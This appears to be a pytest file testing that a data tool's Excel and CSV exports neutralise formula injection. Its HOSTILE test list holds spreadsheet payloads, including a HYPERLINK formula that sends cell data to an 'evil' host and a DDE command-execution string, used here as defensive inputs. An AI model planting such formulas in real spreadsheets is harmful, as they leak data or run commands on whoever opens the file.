"""Exports: text that looks like a formula or a link stays text (G-06); CSV exports neutralise it."""
import io
import json
import os

import numpy as np
import openpyxl
import pandas as pd
import pytest

import datadragon
from helpers import make_xlsx, output_path, post_form, post_job, sync_output
from test_merge import write_rows

HOSTILE = ['=HYPERLINK("http://evil/?"&A2,"x")', "+cmd|' /C calc'!A0", "-2+3", "@SUM(1,1)", "=1+1",
           "http://example.com/phish", "\tTAB", "normal"]


def cell_types(path):
    wb = openpyxl.load_workbook(path)
    return {(ws.title, c.coordinate): (c.data_type, c.value) for ws in wb.worksheets for row in ws.iter_rows() for c in row}


def assert_no_formulas_or_links(path):
    wb = openpyxl.load_workbook(path)
    for ws in wb.worksheets:
        assert not ws._hyperlinks, f"{ws.title} has hyperlinks"
        for row in ws.iter_rows():
            for c in row:
                assert c.data_type != "f", (ws.title, c.coordinate, c.value)


def hostile_csv(tmp_path):
    return write_rows(tmp_path / "h.csv", ["id", "note"], [[str(i), v] for i, v in enumerate(HOSTILE)])


# ------------------------------------------------------------------ the writer
def test_write_excel_keeps_formula_like_text_as_text(tmp_path):
    path = str(tmp_path / "w.xlsx")
    datadragon.write_excel(pd.DataFrame({"note": HOSTILE, "n": range(len(HOSTILE))}), path)
    assert_no_formulas_or_links(path)
    ws = openpyxl.load_workbook(path).active
    assert [ws.cell(row=r, column=1).value for r in range(2, 2 + len(HOSTILE))] == HOSTILE    # byte-for-byte text
    assert all(ws.cell(row=r, column=1).data_type == "s" for r in range(2, 2 + len(HOSTILE)))
    assert ws.cell(row=2, column=2).data_type == "n"                                          # real numbers stay numbers


def test_write_excel_keeps_value_types(tmp_path):
    import datetime as dt
    path = str(tmp_path / "t.xlsx")
    frame = pd.DataFrame({"i": [1, 2], "f": [1.5, np.nan], "b": [True, False], "d": [dt.datetime(2024, 1, 2), dt.datetime(2024, 2, 3, 4, 5)],
                          "t": ["x", None]})
    datadragon.write_excel(frame, path)
    ws = openpyxl.load_workbook(path).active
    rows = [[c.value for c in row] for row in ws.iter_rows(min_row=2)]
    assert rows == [[1, 1.5, True, dt.datetime(2024, 1, 2), "x"], [2, None, False, dt.datetime(2024, 2, 3, 4, 5), None]]


def test_blank_cells_are_real_blanks_not_empty_text(tmp_path):
    path = str(tmp_path / "b.xlsx")
    datadragon.write_excel(pd.DataFrame({"a": ["x", None], "b": [None, 1.0]}), path)
    ws = openpyxl.load_workbook(path).active
    assert ws["A3"].value is None and ws["A3"].data_type == "n"      # an empty-string text cell would be 'inlineStr'/'s'


def test_multi_sheet_writer_and_options(tmp_path):
    path = str(tmp_path / "m.xlsx")
    with datadragon.excel_writer(path) as writer:
        pd.DataFrame({"a": ["=1+1"]}).to_excel(writer, sheet_name="One", index=False)
        pd.DataFrame({"b": ["@x"]}).to_excel(writer, sheet_name="Two", index=False)
    assert_no_formulas_or_links(path)
    assert openpyxl.load_workbook(path).sheetnames == ["One", "Two"]


# ------------------------------------------------------------------ CSV
@pytest.mark.parametrize("value,expected", [
    ("=1+1", "'=1+1"), ("+cmd", "'+cmd"), ("-x", "'-x"), ("@SUM(A1)", "'@SUM(A1)"), ("\tx", "'\tx"), ("\rx", "'\rx"),
    ("-", "'-"), ("-5", "-5"), ("+3.2", "+3.2"), ("-1e3", "-1e3"), ("normal", "normal"), ("a=b", "a=b"), ("", ""),
])
def test_sanitize_csv_rules(value, expected):
    assert datadragon.sanitize_csv(pd.DataFrame({"c": [value]}))["c"].iloc[0] == expected


def test_sanitize_csv_leaves_numbers_nan_and_the_input_alone():
    frame = pd.DataFrame({"n": [1, -2], "f": [np.nan, -0.5], "o": ["=x", None]}, dtype=object)
    frame["n"] = frame["n"].astype(int)
    before = frame.copy()
    out = datadragon.sanitize_csv(frame)
    assert out["n"].tolist() == [1, -2] and out["o"].iloc[0] == "'=x" and pd.isna(out["o"].iloc[1])
    assert frame.equals(before)


def test_write_data_file_csv_is_sanitised(tmp_path):
    path = datadragon.write_data_file(pd.DataFrame({"note": HOSTILE}), str(tmp_path / "o.csv"), "csv")
    lines = open(path).read().splitlines()[1:]
    assert not any(line.startswith(("=", "+", "@")) for line in lines)
    assert lines[2] == "'-2+3"


def test_anonymizer_csv_output_is_sanitised(tmp_path):
    path = write_rows(tmp_path / "a.csv", ["name", "note"], [["Ann", "=1+1"], ["Bo", "-5"]])
    from test_scrub import run_scrub
    final = run_scrub(path, ["name"], False)
    text = open(output_path(final)).read().splitlines()
    assert text[1].endswith("'=1+1") and text[2].endswith(",-5")


# ------------------------------------------------------------------ every tool's xlsx output
def hostile_xlsx(tmp_path):
    return make_xlsx(tmp_path / "h.xlsx", ["id", "note"], [[i, v] for i, v in enumerate(HOSTILE)], text_cols=("note",))


@pytest.mark.parametrize("url,data,xlsx_input", [
    ("/upload", {"chunk_size": "100"}, True),                       # the splitter only reads Excel
    ("/find-duplicates", {"id_column": "id", "duplicate_columns[]": ["note"]}, False),
    ("/generate-pivot", {"rows[]": ["note"], "values[]": ["id"], "aggfunc": "count"}, False),
    ("/normalize-columns", {"column_types": json.dumps({"id": "integer"})}, False),
    ("/scrub-data", {"columns[]": ["id"], "relationship_preserve": "false"}, True),
    ("/transpose-data", {}, False),
    ("/find-unique-identifier", {"selected_columns[]": ["id", "note"]}, False),
])
def test_job_outputs_never_contain_formulas_or_links(client, tmp_path, url, data, xlsx_input):
    source = hostile_xlsx(tmp_path) if xlsx_input else hostile_csv(tmp_path)
    final, _ = post_job(client, url, {"file": source}, data)
    assert final["stage"] == "done", final
    path = output_path(final)
    if path.endswith(".zip"):
        import zipfile
        zf = zipfile.ZipFile(path)
        for name in zf.namelist():
            if name.endswith(".xlsx"):
                extracted = tmp_path / name
                extracted.write_bytes(zf.read(name))
                assert_no_formulas_or_links(str(extracted))
    else:
        assert_no_formulas_or_links(path)


@pytest.mark.parametrize("url,data", [
    ("/row-filter", {"conditions": json.dumps([{"column": "note", "operator": "is_not_empty"}])}),
    ("/find-replace", {"find_text": "zzz", "replace_text": "y"}),
    ("/column-operations", {"operation": "rename", "renames": json.dumps({"id": "ident"})}),
    ("/calculated-columns", {"formula": "[id] * 2", "new_column_name": "double"}),
])
def test_sync_tool_outputs_never_contain_formulas_or_links(client, tmp_path, url, data):
    resp, payload = post_form(client, url, {"file": hostile_csv(tmp_path)}, data)
    assert resp.status_code == 200, payload
    assert_no_formulas_or_links(sync_output(payload))
    notes = [c.value for c in openpyxl.load_workbook(sync_output(payload)).active["B"][1:]]
    assert notes == HOSTILE


def test_merge_and_compare_outputs_are_safe(tmp_path):
    from test_compare import run_compare
    from test_merge import run_merge
    left, right = hostile_csv(tmp_path), write_rows(tmp_path / "r.csv", ["id", "rv"], [["0", "=2+2"], ["1", "+9"]])
    merged = run_merge(left, right, "outer")
    assert_no_formulas_or_links(output_path(merged))
    a, b = hostile_csv(tmp_path), write_rows(tmp_path / "b.csv", ["id", "note"], [["0", "=changed()"]])
    compared = run_compare(a, b, ["id"])
    assert_no_formulas_or_links(output_path(compared))


def test_formula_like_column_names_stay_text_too(tmp_path):
    path = write_rows(tmp_path / "c.csv", ["=A1+1", "@x"], [["1", "2"]])
    from test_pivot import run_pivot
    out = run_pivot(path, ["=A1+1"], [], ["@x"], "sum")
    assert out["stage"] == "done", out
    assert_no_formulas_or_links(output_path(out))


# ------------------------------------------------------------------ the two sites that styled via openpyxl internals
def test_column_comparison_colours_yes_and_no_with_conditional_formats(client, tmp_path):
    a = write_rows(tmp_path / "a.csv", ["name", "x"], [["1", "2"]])
    b = write_rows(tmp_path / "b.csv", ["name", "y"], [["1", "2"]])
    final, _ = post_job(client, "/compare-columns", {"file1": a, "file2": b})
    assert final["stage"] == "done", final
    ws = openpyxl.load_workbook(output_path(final))["Column Comparison"]
    values = {ws.cell(row=r, column=1).value: (ws.cell(row=r, column=2).value, ws.cell(row=r, column=3).value) for r in range(2, ws.max_row + 1)}
    assert values == {"name": ("Yes", "Yes"), "x": ("Yes", "No"), "y": ("No", "Yes")}
    rules = [rule for ranges in ws.conditional_formatting for rule in ranges.rules]
    assert len(rules) == 2 and {r.formula[0] for r in rules} == {'"Yes"', '"No"'}


def test_test_file_generator_sets_column_widths(client):
    resp = client.get("/generate-test-file?num_rows=30")
    ws = openpyxl.load_workbook(io.BytesIO(resp.data)).active
    widths = [ws.column_dimensions[c].width for c in "ABCDE"]
    assert all(w and w > 5 for w in widths) and ws.max_row == 31


# ------------------------------------------------------------------ write_excel's direct fast path
def test_header_row_is_bold_bordered_and_centred(tmp_path):
    path = str(tmp_path / "h.xlsx")
    datadragon.write_excel(pd.DataFrame({"a": [1], "b": ["x"]}), path)
    cell = openpyxl.load_workbook(path).active["A1"]
    assert cell.font.b and cell.alignment.horizontal == "center" and cell.border.left.style == "thin"
    assert not openpyxl.load_workbook(path).active["A2"].font.b


def test_infinities_and_nan_follow_the_old_conventions(tmp_path):
    path = str(tmp_path / "i.xlsx")
    datadragon.write_excel(pd.DataFrame({"v": [np.inf, -np.inf, np.nan, 2.5, None]}), path)
    ws = openpyxl.load_workbook(path).active
    assert [ws.cell(row=r, column=1).value for r in range(2, 7)] == ["inf", "-inf", None, 2.5, None]


def test_non_string_column_names_become_text_headers(tmp_path):
    path = str(tmp_path / "n.xlsx")
    datadragon.write_excel(pd.DataFrame([[1, 2]], columns=[2024, "x"]), path)
    assert [c.value for c in openpyxl.load_workbook(path).active[1]] == ["2024", "x"]


def test_numpy_scalars_and_dates_round_trip(tmp_path):
    import datetime as dt
    path = str(tmp_path / "np.xlsx")
    frame = pd.DataFrame({"i": np.array([1, 2], dtype=np.int64), "u": np.array([3, 4], dtype=np.uint8),
                          "f": np.array([0.5, 1.5], dtype=np.float32), "b": np.array([True, False]),
                          "ts": pd.to_datetime(["2024-01-02", "2024-03-04 05:06:07"], format="mixed"),
                          "d": [dt.date(2024, 1, 2), dt.date(2024, 5, 6)], "nat": [pd.NaT, pd.Timestamp("2024-01-01")]})
    datadragon.write_excel(frame, path)
    ws = openpyxl.load_workbook(path).active
    row1 = [c.value for c in ws[2]]
    assert row1[:4] == [1, 3, 0.5, True] and row1[4] == dt.datetime(2024, 1, 2) and row1[6] is None
    assert [c.value for c in ws[3]][4] == dt.datetime(2024, 3, 4, 5, 6, 7)


def test_unicode_and_long_text(tmp_path):
    path = str(tmp_path / "u.xlsx")
    text = "café 中文 \U0001F600"
    datadragon.write_excel(pd.DataFrame({"t": [text, "x" * 5000]}), path)
    ws = openpyxl.load_workbook(path).active
    assert ws["A2"].value == text and ws["A3"].value == "x" * 5000


def test_a_sheet_over_excels_limits_is_refused_with_a_clear_message(tmp_path, monkeypatch):
    monkeypatch.setattr(datadragon, "EXCEL_MAX_ROWS", 5)
    with pytest.raises(ValueError, match="too large for Excel"):
        datadragon.write_excel(pd.DataFrame({"a": range(5)}), str(tmp_path / "big.xlsx"))     # 5 rows + header > 5
    datadragon.write_excel(pd.DataFrame({"a": range(4)}), str(tmp_path / "ok.xlsx"))           # exactly fits
    monkeypatch.setattr(datadragon, "EXCEL_MAX_COLUMNS", 2)
    with pytest.raises(ValueError, match="too large for Excel"):
        datadragon.write_excel(pd.DataFrame([[1, 2, 3]]), str(tmp_path / "wide.xlsx"))


def test_unusual_options_fall_back_to_pandas(tmp_path):
    path = str(tmp_path / "idx.xlsx")
    datadragon.write_excel(pd.DataFrame({"a": ["=1+1"]}, index=["r1"]), path, index=True)
    ws = openpyxl.load_workbook(path).active
    assert [c.value for c in ws[2]] == ["r1", "=1+1"] and ws["B2"].data_type == "s"


def test_empty_frames_write_a_header_only_sheet(tmp_path):
    path = str(tmp_path / "e.xlsx")
    datadragon.write_excel(pd.DataFrame({"a": [], "b": []}), path)
    ws = openpyxl.load_workbook(path).active
    assert [c.value for c in ws[1]] == ["a", "b"] and ws.max_row == 1
